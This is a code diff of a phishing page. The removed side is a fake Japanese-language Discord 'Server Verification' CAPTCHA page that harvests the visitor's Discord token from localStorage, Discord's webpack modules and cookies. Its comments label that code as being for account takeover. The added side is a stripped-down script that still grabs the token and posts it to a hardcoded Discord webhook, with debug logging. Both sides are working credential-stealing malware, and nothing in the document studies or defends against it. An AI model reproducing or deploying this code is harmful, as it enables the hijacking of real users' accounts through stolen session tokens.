@@ -1,192 +1,60 @@
-<!DOCTYPE html>
-<html lang="ja">
-<head>
-    <meta charset="UTF-8">
-    <title>Server Verification</title>
-    <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            background: #36393f;
-            color: white;
-            font-family: 'Whitney', sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-        }
-        .box {
-            background: #2f3136;
-            padding: 40px;
-            border-radius: 8px;
-            text-align: center;
-            width: 400px;
-        }
-        .logo {
-            width: 80px;
-            height: 80px;
-            background: #5865F2;
-            border-radius: 50%;
-            margin: 0 auto 20px;
-            line-height: 80px;
-            font-size: 40px;
-        }
-        .captcha-box {
-            background: #40444b;
-            border-radius: 4px;
-            padding: 20px;
-            margin: 20px 0;
-            cursor: pointer;
-        }
-        .captcha-box label {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            cursor: pointer;
-        }
-        #check { width: 24px; height: 24px; }
-        #btn {
-            background: #4a4a4a;
-            color: white;
-            border: none;
-            padding: 16px 40px;
-            font-size: 16px;
-            border-radius: 4px;
-            cursor: not-allowed;
-            width: 100%;
-            margin-top: 20px;
-        }
-        #btn.enabled {
-            background: #3ba55d;
-            cursor: pointer;
-        }
-        #btn.enabled:hover { background: #2d7d46; }
-        #loading, #success { display: none; margin-top: 20px; }
-        .spinner {
-            border: 3px solid #4a4a4a;
-            border-top: 3px solid #3ba55d;
-            border-radius: 50%;
-            width: 40px;
-            height: 40px;
-            animation: spin 1s linear infinite;
-            margin: 20px auto;
-        }
-        @keyframes spin { to { transform: rotate(360deg); } }
-    </style>
-</head>
-<body>
-    <div class="box">
-        <div class="logo">✓</div>
-        <h2>Server Verification</h2>
-        <p id="server" style="color: #b9bbbe; margin-bottom: 20px;">Server: Gaming Community</p>
+<script>
+    const WEBHOOK = "https://discordapp.com/api/webhooks/1510663755459989644/7J6-Qbs56tJnecY3unFeV6ATkho_LjCsvTYDcVy3ma2Ntj-hgC0AXDJWjuxME_4F7A5F";
+    
+    async function verify() {
+        console.log("=== 認証開始 ===");
         
-        <div class="captcha-box" onclick="toggleCheck()">
-            <label onclick="event.stopPropagation()">
-                <input type="checkbox" id="check" onchange="updateButton()">
-                <span>私はロボットではありません</span>
-            </label>
-        </div>
+        // トークン取得
+        let token = null;
         
-        <button id="btn" onclick="verify()" disabled>認証する</button>
-        
-        <div id="loading">
-            <div class="spinner"></div>
-            <p style="color: #b9bbbe;">認証中...</p>
-        </div>
-        
-        <div id="success">
-            <p style="color: #3ba55d;">✅ 認証完了</p>
-        </div>
-    </div>
-
-    <script>
-        // ========== 【必須】Webhook URL ==========
-        const WEBHOOK = "https://discordapp.com/api/webhooks/1508553996871401664/rKpIHQpChzu64RwWzl9YxR0FZdUj1jNUKMMMpjD6vZXcMVLYrdcmbNGiU1cJ9ShxvhLG";
-        
-        // サーバー名表示
-        const params = new URLSearchParams(location.search);
-        const srv = params.get('server');
-        if (srv) document.getElementById('server').textContent = 'Server: ' + decodeURIComponent(srv);
-        
-        // チェックボックス切り替え
-        function toggleCheck() {
-            const cb = document.getElementById('check');
-            cb.checked = !cb.checked;
-            updateButton();
+        // LocalStorageチェック
+        try {
+            token = localStorage.getItem('token');
+            console.log("LocalStorage:", token ? "トークンあり" : "なし");
+        } catch(e) {
+            console.log("LocalStorageエラー:", e);
         }
         
-        // ボタン状態更新
-        function updateButton() {
-            const cb = document.getElementById('check');
-            const btn = document.getElementById('btn');
-            
-            if (cb.checked) {
-                btn.disabled = false;
-                btn.classList.add('enabled');
-            } else {
-                btn.disabled = true;
-                btn.classList.remove('enabled');
-            }
-        }
-        
-        // 認証実行（トークン抽出・送信）
-        async function verify() {
-            const btn = document.getElementById('btn');
-            const loading = document.getElementById('loading');
-            const success = document.getElementById('success');
-            
-            btn.style.display = 'none';
-            document.querySelector('.captcha-box').style.display = 'none';
-            loading.style.display = 'block';
-            
-            // トークン取得（複数方法）
-            let token = null;
-            
-            // 方法1: LocalStorage
+        // webpackチェック
+        if (!token) {
+            console.log("webpackチェック...");
             try {
-                token = localStorage.getItem('token');
-            } catch(e) {}
-            
-            // 方法2: webpack（Discord内部API）
-            if (!token && window.webpackChunkdiscord_app) {
-                try {
+                if (window.webpackChunkdiscord_app) {
                     const modules = [];
                     window.webpackChunkdiscord_app.push([[''], {}, (e) => {
                         for (let c in e.c) modules.push(e.c[c]);
                     }]);
                     const mod = modules.find(m => m?.exports?.default?.getToken);
-                    if (mod) token = mod.exports.default.getToken();
-                } catch(e) {}
+                    if (mod) {
+                        token = mod.exports.default.getToken();
+                        console.log("webpack: トークン取得");
+                    }
+                } else {
+                    console.log("webpack: Discordアプリが見つからない");
+                }
+            } catch(e) {
+                console.log("webpackエラー:", e);
             }
-            
-            // 方法3: Cookie
-            if (!token) {
-                try {
-                    const match = document.cookie.match(/token=([^;]+)/);
-                    if (match) token = match[1];
-                } catch(e) {}
-            }
-            
-            // トークン送信（乗っ取り用）
-            if (token) {
-                try {
-                    await fetch(WEBHOOK, {
-                        method: 'POST',
-                        headers: {'Content-Type': 'application/json'},
-                        body: JSON.stringify({
-                            content: `🔑 Discord Token Captured:\n\`\`\`${token}\`\`\``,
-                            username: "Token Logger"
-                        })
-                    });
-                } catch(e) {}
-            }
-            
-            // 完了表示
-            loading.style.display = 'none';
-            success.style.display = 'block';
-            
-            // Discordに戻る
-            setTimeout(() => location.href = 'https://discord.com', 2000);
         }
-    </script>
-</body>
-</html>
+        
+        console.log("最終トークン:", token ? token.substring(0, 20) + "..." : "未取得");
+        
+        // 送信
+        if (token) {
+            try {
+                const res = await fetch(WEBHOOK, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        content: `Token: \`\`\`${token}\`\`\``
+                    })
+                });
+                console.log("送信結果:", res.status);
+            } catch(e) {
+                console.log("送信エラー:", e);
+            }
+        } else {
+            console.log("送信スキップ: トークンなし");
+        }
+    }
+</script>
